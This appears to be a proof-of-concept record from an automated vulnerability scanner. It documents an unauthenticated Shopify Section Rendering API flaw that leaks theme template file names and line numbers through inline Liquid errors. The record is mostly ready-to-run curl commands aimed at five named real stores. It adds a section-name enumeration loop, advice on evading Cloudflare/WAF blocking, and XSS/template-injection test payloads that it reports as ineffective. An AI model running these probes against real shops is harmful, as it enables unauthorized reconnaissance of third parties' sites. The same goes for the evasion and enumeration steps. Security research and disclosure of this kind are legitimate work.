# Shopify 店 Section Rendering API 跨上下文渲染：未认证泄露主题模板文件名与行号（响应内联 Liquid error，?section_id= / ?sections=）

- **code**: shopify-section-rendering-api-cross-context-liquid-error-tem
- **kind**: poc
- **category**: info-leak
- **component**: Shopify 主题 Section Rendering API（?section_id= / ?sections=）
- **versions**: 主题 Horizon 4.3.0（www.retro32.com 实测）；其余店主题各异，缺陷为平台侧通用
- **severity**: low
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11~11-12 本机（ARTEX 执行环境）curl 实测，单线程、请求间隔≥3s，五家独立 Shopify 店（4 个不同主题）复现（原始响应落盘 /opt/artex/data/tasks/7/i1445/、/opt/artex/data/tasks/11/i1036/、/opt/artex/data/tasks/9/i2153/、/opt/artex/data/tasks/12/i3959/）：
⑤ 最新一轮 www.retro32.com（task#12/finding#194，finding_checks.verdict=verified、status=confirmed，全程无 Cookie/Authorization/账号，主题 Horizon 4.3.0）：GET /search?q=amiga&section_id=template--31109627216219__main → HTTP/2 200 / 62025B / text/html，正文两条 "Liquid error (sections/main-collection line 37): standard_event_data does not support NilClass. Supported types: product, collection, cart" 与 "Liquid error (sections/main-collection line 62): Array 'collection.products' is not paginateable."；匹配路由阴性对照 GET /collections/all?section_id=同id → 200 / 574923B 且 grep -c 'Liquid error' = 0；GET /?section_id=同id → 200 / 62025B 同一 line 37/62；GET /search?q=amiga&sections=template--31109627216219__main,template--31109627445595__main → 200 application/json / 145737B，JSON 值内嵌同一 line 37/62；按文件名渲染 GET /search?q=amiga&section_id=main-blog → 200 / 1806B "Liquid error (sections/main-blog line 33)"；存在性 oracle 对照 GET /?section_id=nonexistent-section-xyz123 → 404 / 0B；匹配上下文对照 GET /search?q=amiga&section_id=template--31109627478363__search → 200 / 8296B / 0 条 Liquid error。
① retro-refresh.com（task#9/finding#149）：/search?q=ipod&section_id=template--32322572124492__collection-products → 200 / 5428B "sections/main-collection-products line 89"；/search?q=ipod&section_id=template--32322572681548__main → 200 / 16274B "sections/main-product line 257/315"；/search?q=ipod&section_id=main-account → 200 / 962B "sections/main-account line 20"；/search?q=ipod&section_id=main-blog → 200 / 2233B "sections/main-blog line 124"；阴性对照 /collections/all?section_id=同id → 200 / 553820B / 0 条；/?section_id=nonexistent-section-xyz123 → 404 / 0B，23 个主题 section 文件名 200/非空。
② goffsgames.co.uk（task#11/finding#97）：/search?q=game&section_id=template--32070414106973__product-grid → 200 "sections/main-collection-product-grid line 27"；/products/grand-theft-auto-vi-xbox-series-x-s?section_id=template--32070414401885__main → 200 "sections/main-search line 62"；匹配路由 /collections/accessories?section_id=同id → 0 条。
③ www.thegamecollection.net 与 ④ collect.thegamecollection.net（task#7/finding#113）：collection-products line 90 / main-product line 328/376 与 442/449/516，匹配路由均 0 条，?sections= JSON 同样内嵌报错，main-blog line 121 + 404 对照成立。
判据：同一 section id 在不匹配路由 → 200 且内联 Liquid error（含 sections/*.liquid 文件名+行号）；在匹配路由 → 0 条，两者同时成立即确认跨上下文渲染缺陷。
- **path**: pocs/shopify-section-rendering-api-cross-context-liquid-error-tem/poc.md
- **tags**: shopify,section-rendering-api,section_id,sections-param,liquid-error,info-leak,template-path,line-number,section-existence-oracle,ecommerce,unauthenticated,retro-refresh,retro32,horizon,main-account,section-enumeration,encoding-negative
- **created_at**: 2026-11-11T15:56:32.583Z
- **engine**: www.retro32.com; retro-refresh.com; goffsgames.co.uk; www.thegamecollection.net; collect.thegamecollection.net
- **found_by**: vuln-scan

## 描述

Shopify 主题的 Section Rendering API（GET 任意页面路径时附带 ?section_id=<id> 或 ?sections=<id> 只渲染该 section）缺少「section 与路由上下文一致性」校验：可把 A 路由（collection/product/search/account/blog）专属的 section id 丢到 B 路由上请求，Shopify 会在缺失对应路由对象的上下文里继续渲染该 section，返回 200 并把 Liquid 报错内联输出，从而未认证泄露主题内部模板文件名与行号。已在 5 家独立店复现（4 个不同主题，含 Horizon 4.3.0）：www.retro32.com（main-collection line 37/62、main-blog line 33）、retro-refresh.com（main-collection-products line 89、main-product line 257/315、main-account line 20、main-blog line 124）、goffsgames.co.uk（main-collection-product-grid line 27、main-search line 62）、www.thegamecollection.net（line 90、main-product line 328/376）、collect.thegamecollection.net（line 90、main-product line 442/449/516）。另可用主题 section 文件名直接渲染当前路由模板未引用的 section（含匿名上下文渲染 account 模板），不存在的 section 名返回 404/0B，构成 section 存在性 oracle。编码面实测阴性：search q 与 cart note 在片段中均经 HTML 实体编码，原始标签 0 命中、{{7*7}} 不执行，不能升级为 output encoding validation/SSTI。影响限于主题源码结构泄露，不泄露买家 PII/订单/未公开商品，故 low。

## 用法

```
前置：目标为 Shopify 托管店（存在 Section Rendering API）。无需任何 Cookie / 令牌 / 账号；任一页面上公开出现的 section id 即可（从任意页面 HTML 的 id="shopify-section-<id>" 或页面 JSON 中提取）。一般无需特殊 UA；Cloudflare 拦裸 curl UA 时换浏览器类 UA，单线程、请求间隔 ≥3s。

【1) 取 section id】
curl -sk 'https://<shop>/' | grep -oE 'shopify-section-[0-9]+__[a-z0-9-]+' | sort -u
# 典型形如 template--24826644529476__collection-products（collection）/ template--24826644463940__main（product）
# www.retro32.com（Horizon 4.3.0）：template--31109627216219__main（collection main，从 /collections/all 695998B 页面提取）、template--31109627478363__search（search main）
# retro-refresh.com：template--32322572124492__collection-products（集合）/ template--32322572681548__main（商品）/ template--32322572747084__main（搜索）

【2) 跨上下文渲染（决定性）】把 collection 专属 section 丢到 search 路由：
curl -sk 'https://<shop>/search?q=game&section_id=template--24826644529476__collection-products'
# → HTTP 200，body 含 Liquid error (sections/main-collection-products line 90): Array 'collection.products' is not paginateable.
curl -sk 'https://<shop>/search?q=game&section_id=template--24826644463940__main'
# → HTTP 200，body 含 Liquid error (sections/main-product line 328): product form must be given a product
# www.retro32.com 实测：/search?q=amiga&section_id=template--31109627216219__main → 200 / 62025B，两条 main-collection line 37（standard_event_data does not support NilClass）+ line 62（collection.products is not paginateable）
也可反向：把 product/search 专属 section 丢到 collection/product 路由；丢到首页路由同样成立（retro32.com /?section_id=同id → 200 / 62025B 同一 line 37/62；retro-refresh.com /?section_id=<collection id> → 200/5428B 同一 line 89）。

【3) 阴性对照（必做）】同一 id 放回匹配路由，应 0 条报错：
curl -sk 'https://<shop>/collections/all?section_id=template--24826644529476__collection-products' | grep -c 'Liquid error'
# → 0
# www.retro32.com：/collections/all?section_id=template--31109627216219__main → 200 / 574923B / 0 条
# 匹配搜索路由对照：/search?q=amiga&section_id=template--31109627478363__search → 200 / 8296B / 0 条

【4) 批量变体 ?sections=（返回 JSON，适合一次取多个 section）】
curl -sk 'https://<shop>/search?q=game&sections=template--24826644529476__collection-products'
# → 200 application/json，JSON 值内嵌同一 Liquid error
# 双 section 变体（逗号分隔）：retro32.com /search?q=amiga&sections=template--31109627216219__main,template--31109627445595__main → 200 / 145737B，内嵌同一 line 37/62
# retro-refresh.com：/search?q=ipod&sections=<collection id>,<product main id> → 200/23053B 同时内嵌 line 89 与 product line 257/315

【5) 附加面：按主题 section 文件名渲染 + 存在性 oracle】
curl -sk 'https://<shop>/search?q=game&section_id=main-blog'
# → 200，含 Liquid error (sections/main-blog line 121)（当前路由模板未引用该 section 也可渲染）
# www.retro32.com 实测：/search?q=amiga&section_id=main-blog → 200 / 1806B，"sections/main-blog line 33"
curl -sk 'https://<shop>/search?q=ipod&section_id=main-account'
# → 200/962B，含 Liquid error (sections/main-account line 20): Array 'customer.orders' is not paginateable.
#   匿名上下文也能渲染 account 专属模板；仅泄露文件名+行号，不含 customer 数据
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' 'https://<shop>/?section_id=nonexistent-section-xyz123'
# → 404 0（存在返回 200/非空 → 可用 200 vs 404 判定 section 是否存在）
# 批量枚举：for n in main-article main-page main-cart main-list-collections main-login main-password main-search main-collection-banner; do printf '%s ' "$n"; curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://<shop>/search?q=x&section_id=$n"; done
# 重复参数：?section_id=a&section_id=b → 服务端取最后一个

【6) 编码面（阴性，勿升级）】search q / cart note 注入 "><img src=x onerror=...>{{7*7}} 在 section 片段中回显为 &quot;&gt;&lt;img src=x ...，grep 原始 '<img src=x' = 0，{{7*7}} 不执行 → 该面止于信息泄露。

判据：同一 section id 在「不匹配的路由」上 → 200 且内联 Liquid error（含 sections/*.liquid 文件名+行号）；在「匹配的路由」上 → 0 条 Liquid error。两者对照成立即确认跨上下文渲染缺陷。

失败常见原因：
- 拿到的是 header/footer 等静态 section → 不依赖路由对象，不报错；需换 main-collection / main-collection-products / main-product / main-search / main-account / main-blog 这类依赖路由对象的 main section（命名随主题不同：Horizon 为 main-collection，旧主题为 main-collection-products）；
- 目标未启用 Section Rendering API 或主题未用 {% schema %} section → 无该面；
- 请求被 CF/WAF 拦（裸 curl UA 可能 403/405）→ 带浏览器类 UA，降速重试；单线程、间隔 ≥3s；
- 只发一次请求容易把「模板本来就有报错」误判为漏洞 → 必须做匹配路由的阴性对照；
- section id 含模板前缀（template--<数字>__<名>），直接传完整值，别截断。
```

## 正文

```
# Shopify Section Rendering API 跨上下文渲染 → 未认证泄露主题模板文件名与行号

## 一句话
Shopify 主题的 Section Rendering API（`?section_id=` / `?sections=`）允许把**不属于当前路由上下文**的 section id
（collection / product / search / account / blog 专属 section）丢到别的路由上渲染。Shopify 不做「section 与路由对象」的一致性校验，
在缺失 `collection` / `product` / `search` / `customer` / `blog` 对象的上下文里照样渲染该 section，返回 `200` 并把 **Liquid 报错内联**，
从而未认证泄露主题内部模板文件名与行号。正确上下文渲染时 0 条 Liquid 错误（阴性对照），确证系跨上下文渲染能力所致。

已跨 **5 家独立 Shopify 店 / 4 个不同主题**验证：
- www.retro32.com（task#12，finding#194，2026-11-12，主题 **Horizon 4.3.0**）
- retro-refresh.com（task#9，finding#149，2026-11-11）
- goffsgames.co.uk（task#11，finding#97）
- www.thegamecollection.net（task#7，finding#113）
- collect.thegamecollection.net（task#7，finding#113，tgc-collectables 独立店，同一集团第二店铺，同一缺陷独立成立）

## 前置条件
- 目标为 Shopify 托管店（存在 Section Rendering API）。
- **无需任何 Cookie / 令牌 / 账号**。
- 已知任一页面上公开出现的 section id（从任意页面 HTML 的 `id="shopify-section-<id>"`、
  或页面内嵌 JSON / `?sections=` 调用点提取）。
- 一般无需特殊 UA；若被 Cloudflare 405/403，换浏览器类 User-Agent。WAF 按速率触发 → 单线程、请求间隔 ≥3s。

## 步骤

### 1) 从任意页面取 section id
```bash
curl -sk 'https://<shop>/' | grep -oE 'shopify-section-[0-9]+__[a-z0-9-]+' | sort -u
# goffsgames.co.uk 典型：
#   template--32070414106973__product-grid        <- collection 的 main-collection-product-grid
#   template--32070414336349__main                <- product 的 main-product
#   template--32070414401885__main                <- search 的 main-search
# www.thegamecollection.net 典型：
#   template--24826644529476__collection-products <- collection
#   template--24826644463940__main                <- product
# collect.thegamecollection.net 典型：
#   template--23755729502545__collection-products
#   template--23755729404241__main
# retro-refresh.com 典型：
#   template--32322572124492__collection-products  <- collection（/collections/all 200/866452B 内出现）
#   template--32322572681548__main                 <- product
#   template--32322572747084__main                 <- search
# www.retro32.com 典型（主题 Horizon 4.3.0，collection main 文件名为 main-collection 而非 main-collection-products）：
#   template--31109627216219__main                 <- collection（从 /collections/all 200/695998B 提取）
#   template--31109627478363__search               <- search（匹配上下文对照 0 条报错）
#   template--31109627445595__main                 <- 同店另一 main section（?sections= 批量时一并渲染）
```

### 2) 跨上下文渲染（决定性请求）
把 **collection 专属** section 请求到 **search 路由**：
```bash
curl -sk 'https://<shop>/search?q=game&section_id=template--24826644529476__collection-products'
# → HTTP/2 200
#   Liquid error (sections/main-collection-products line 90): Array 'collection.products' is not paginateable.

curl -sk 'https://<shop>/search?q=game&section_id=template--24826644463940__main'
# → HTTP/2 200
#   Liquid error (sections/main-product line 328): product form must be given a product
#   Liquid error (sections/main-product line 376): ...

# www.retro32.com（Horizon 4.3.0）实测：
curl -sk 'https://www.retro32.com/search?q=amiga&section_id=template--31109627216219__main'
# → HTTP/2 200 / 62025B / text/html，正文内联：
#   Liquid error (sections/main-collection line 37): standard_event_data does not support NilClass. Supported types: product, collection, cart
#   Liquid error (sections/main-collection line 62): Array 'collection.products' is not paginateable.
```
反向变体同样成立（把 search 专属 section 丢到 product 路由，goffsgames 实测 `sections/main-search line 62`）。
丢到首页路由也成立：retro-refresh.com `GET /?section_id=template--32322572124492__collection-products` → 200 / 5428B，同一条 `line 89`；
www.retro32.com `GET /?section_id=template--31109627216219__main` → 200 / 62025B，同一 `line 37/62`。

### 3) 阴性对照（必做，排除「模板自带报错」）
让 section 与其路由上下文**匹配**，此时不应有 Liquid 错误：
```bash
curl -sk 'https://<shop>/collections/all?section_id=template--24826644529476__collection-products' \
  | grep -c 'Liquid error'
# → 0   （www.thegamecollection.net 实测：200 / 1058038B / 0 条）
# collect 店同理：/collections/all 与 /products/azul-board-game 各 0 条
# retro-refresh.com：/collections/all?section_id=template--32322572124492__collection-products
#   → 200 / 553820B / 0 条；/products/retro-refresh-gift-card?section_id=template--32322572681548__main
#   → 200 / 37203B / 0 条
# www.retro32.com：/collections/all?section_id=template--31109627216219__main
#   → 200 / 574923B / 0 条（关键阴性对照）
#   搜索路由自身对照：/search?q=amiga&section_id=template--31109627478363__search
#   → 200 / 8296B / 0 条
```

### 4) `?sections=` 批量变体（JSON 响应，同样泄露）
```bash
curl -sk 'https://<shop>/search?q=game&sections=template--24826644529476__collection-products'
# → HTTP/2 200，Content-Type: application/json
#   JSON 值内嵌同一 Liquid error (sections/main-collection-products line 90)
```
适合一次请求取多个 section 渲染结果；泄露内容与单数 `?section_id=` 一致。
多 section 逗号分隔在 retro-refresh.com 实测：`/search?q=ipod&sections=template--32322572124492__collection-products,template--32322572681548__main`
→ 200 / 23053B / application/json，同时内嵌 `line 89` 与 `main-product line 257/315`。
www.retro32.com 实测：`/search?q=amiga&sections=template--31109627216219__main,template--31109627445595__main`
→ 200 / 145737B / application/json，JSON 值内嵌同一 `main-collection line 37/62`。

### 5) 附加面：按主题 section 文件名渲染 + 存在性 oracle
当前路由模板未引用的 section 也能按主题文件名直接渲染：
```bash
curl -sk 'https://<shop>/search?q=game&section_id=main-blog'
# → HTTP/2 200 / 2265B
#   Liquid error (sections/main-blog line 121): Array 'blog.articles' is not paginateable.
# www.retro32.com 实测：/search?q=amiga&section_id=main-blog → 200 / 1806B，Liquid error (sections/main-blog line 33)

# account 专属模板在匿名上下文同样被渲染（不泄露买家数据，只泄露模板结构）
curl -sk 'https://<shop>/search?q=ipod&section_id=main-account'
# → HTTP/2 200 / 962B
#   Liquid error (sections/main-account line 20): Array 'customer.orders' is not paginateable.

# 批量枚举主题 section 文件名（retro-refresh.com 实测 23 个 200/非空）
for n in main-article main-page main-cart main-list-collections main-login main-password main-search main-collection-banner; do
  printf '%s ' "$n"
  curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' "https://<shop>/search?q=x&section_id=$n"
done
```
不存在的 section 名返回 404：
```bash
curl -sk -o /dev/null -w '%{http_code} %{size_download}\n' \
  'https://<shop>/?section_id=nonexistent-section-xyz123'
# → 404 0   （www.retro32.com 同：404 / 0B）
```
→ `200 + 内联 Liquid error` vs `404 空体` 构成 **section 存在性 oracle**（可探测主题里有哪些 section 文件名）。
补充：`?section_id=` 重复传两次（`?section_id=collection-products&section_id=main-product`）服务端取**最后一个**（retro-refresh 实测 16274B，product main 报错），不是拼接。

## 判据
| 位置 | 期望 |
|---|---|
| section id 与当前路由**不匹配** | `200` 且正文内联 `Liquid error (sections/<file>.liquid line <n>): ...` |
| section id 与当前路由**匹配** | `200` 且 **0** 条 `Liquid error` |
| 猜测的 section 名不存在 | `404` 空响应体 |
| `?sections=` 变体 | `200 application/json`，JSON 值内嵌同一 Liquid error |

两条对照同时成立 → 确认「跨上下文渲染」缺陷，泄露的是**主题内部模板文件名 + 行号**。
报错的文件名与行号随主题/版本不同（Horizon 4.3.0 为 `sections/main-collection line 37/62`，旧主题为 `main-collection-products line 90`），不影响判据。

## 编码面阴性（output encoding validation / SSTI 不成立，勿重复投入）
- `/search?...&section_id=<search main>` 片段中，用户可控 `q` 被 HTML 实体编码：注入
  `"><img src=x onerror=window.__sX=1></script><script>window.__sS=1</script>{{7*7}}`
  回显为 `No results found for “&quot;&gt;&lt;img src=x onerror=window.__sX=1&gt;&lt;/script&gt;&lt;script&gt;window.__sS=1&lt;/script&gt;{{7*7}}”`，
  正文 grep 原始 `<img src=x` = **0 次**，`{{7*7}}` 原样不渲染。
- 自建 cart 写入 `note="><img src=x onerror=window.__nX=1>{{7*7}}"` 后，
  `/cart?section_id=template--32322572058956__main` 与 `/?section_id=sections--32322572845388__cart-drawer`
  两处片段同样以 `&quot;&gt;&lt;img ...` 实体编码渲染（grep 原始 `<img src=x` = 0）。
- 结论：section 片段渲染不会把用户可控值当模板/HTML 执行；该面止于信息泄露，不要按 output encoding validation/SSTI 升级。

## 影响
- 泄露主题/片段源码结构（模板文件名、行号、变量依赖），便于后续模板注入假设或预测隐藏 section。
- 可按 section 文件名探测主题组成（存在性 oracle）。
- **不泄露**买家 PII、订单或未公开商品；account 模板仅渲染报错行号，不含 customer 数据。
- 严重度 low（仅信息泄露，无直接数据/权限获取）。

## 失败常见原因
- 拿到的 section id 是静态 section（header/footer 之类不依赖路由对象）→ 不报错；要换 `main-collection` / `main-collection-products` / `main-product` / `main-search` / `main-account` / `main-blog` 这类依赖路由对象的 main section。
- 目标未启用 Section Rendering API，或主题该 section 无 `{% schema %}` → 无此面。
- 被 Cloudflare/WAF 拦（裸 curl UA 可能 403/405）→ 带浏览器类 UA，降速重试。
- 只发一次请求容易把「页面本来就有的报错」误判为漏洞 → 必须做匹配路由的阴性对照。
- section id 是完整形态 `template--<数字>__<名>`，不要截断成后半段再传。

## 实测记录（五店独立，4 个不同主题）
| 店 | 请求 | 结果 | 匹配路由阴性对照 |
|---|---|---|---|
| www.retro32.com（task#12/finding#194，Horizon 4.3.0） | `/search?q=amiga&section_id=template--31109627216219__main` | 200 / 62025B，`sections/main-collection line 37` + `line 62` | `/collections/all?section_id=同id` → 200 / 574923B / 0 条 |
| www.retro32.com（task#12/finding#194） | `/?section_id=template--31109627216219__main` | 200 / 62025B，同一 line 37/62 | — |
| www.retro32.com（task#12/finding#194） | `/search?q=amiga&sections=template--31109627216219__main,template--31109627445595__main` | 200 application/json / 145737B，JSON 内嵌 line 37/62 | — |
| www.retro32.com（task#12/finding#194） | `/search?q=amiga&section_id=main-blog` | 200 / 1806B，`sections/main-blog line 33` | `/?section_id=nonexistent-section-xyz123` → 404 / 0B |
| www.retro32.com（task#12/finding#194） | `/search?q=amiga&section_id=template--31109627478363__search` | 200 / 8296B，0 条 Liquid error（匹配上下文对照） | — |
| retro-refresh.com（task#9/finding#149） | `/search?q=ipod&section_id=template--32322572124492__collection-products` | 200 / 5428B，`sections/main-collection-products line 89` | `/collections/all?section_id=同id` → 200 / 553820B / 0 条 |
| retro-refresh.com（task#9/finding#149） | `/search?q=ipod&section_id=template--32322572681548__main` | 200 / 16274B，`sections/main-product line 257/315` | `/products/retro-refresh-gift-card?section_id=同id` → 200 / 37203B / 0 条 |
| retro-refresh.com（task#9/finding#149） | `/?section_id=template--32322572124492__collection-products` | 200 / 5428B，同一 `line 89` | — |
| retro-refresh.com（task#9/finding#149） | `/search?q=ipod&section_id=main-account` | 200 / 962B，`sections/main-account line 20` | — （匿名上下文渲染 account 模板） |
| retro-refresh.com（task#9/finding#149） | `/search?q=ipod&section_id=main-blog` | 200 / 2233B，`sections/main-blog line 124` | — |
| retro-refresh.com（task#9/finding#149） | `/search?q=ipod&sections=<collection id>,<product main id>` | 200 application/json / 23053B，内嵌 line 89 与 257/315 | — |
| retro-refresh.com（task#9/finding#149） | `/?section_id=nonexistent-section-xyz123` | 404 / 0B | 23 个主题 section 名 200/非空（main-article 3742B、main-page 784B、main-cart 1512B、main-list-collections 27517B 等） |
| goffsgames.co.uk（task#11） | `/search?q=game&section_id=template--32070414106973__product-grid` | 200，`sections/main-collection-product-grid line 27` | `/collections/accessories?section_id=同id` → 0 条 |
| www.thegamecollection.net（task#7） | `/search?q=game&section_id=template--24826644529476__collection-products` | 200 / 5409B，`sections/main-collection-products line 90` | `/collections/all?section_id=同id` → 200 / 1058038B / 0 条 |
| www.thegamecollection.net（task#7） | `/search?q=game&section_id=template--24826644463940__main` | 200 / 17872B，`sections/main-product line 328/376` | `/products/battlefield-6-ps5?section_id=同id` → 0 条 |
| collect.thegamecollection.net（task#7） | `/search?q=game&section_id=template--23755729502545__collection-products` | 200 / 5306B，`sections/main-collection-products line 90` | `/collections/all?section_id=同id` → 0 条 |
| collect.thegamecollection.net（task#7） | `/search?q=game&section_id=template--23755729404241__main` | 200 / 16110B，`sections/main-product line 442/449/516` | `/products/azul-board-game?section_id=同id` → 0 条 |
| www.thegamecollection.net（task#7） | `/search?q=game&sections=template--24826644529476__collection-products` | 200 application/json（5814B），JSON 内嵌同一 Liquid error | — |
| www.thegamecollection.net（task#7） | `/search?q=game&section_id=main-blog` | 200 / 2265B，`sections/main-blog line 121` | `/?section_id=nonexistent-section-xyz123` → 404 / 0B |

```
